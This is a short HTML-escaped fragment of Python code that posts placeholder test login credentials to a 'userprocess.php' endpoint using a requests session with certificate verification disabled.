    &#039;user&#039;: &#039;test&#039;,
    &#039;pass&#039;: &#039;Testing1@&#039;,
    &#039;sublogin&#039;: &#039;1&#039;
}
    with requests.Session() as s:
         p = s.post(url+&#039;lib/crud/userprocess.php&#039;, data=payload, verify=False)
